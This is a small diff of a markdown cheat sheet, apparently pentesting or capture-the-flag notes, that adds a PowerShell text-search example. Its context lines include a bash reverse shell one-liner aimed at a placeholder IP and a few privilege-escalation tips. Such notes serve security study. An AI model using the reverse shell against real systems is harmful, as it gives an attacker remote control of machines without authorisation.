@@ -100,8 +100,9 @@ Helpful resources
 ### bash
  - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`, reverse shell.
  - `sudo -l` check sudo permissions.
- - 
 
+## Powershell
+ - `Select-String -Path info.txt -Pattern "Money" -AllMatches -Context 4,3`, context 4 is 4 lines before match and 3 after match.
 # Privilige escalation
 ### Linux
  - `id` see what groups we are a part of, google to see if these groups have any extra permissions.
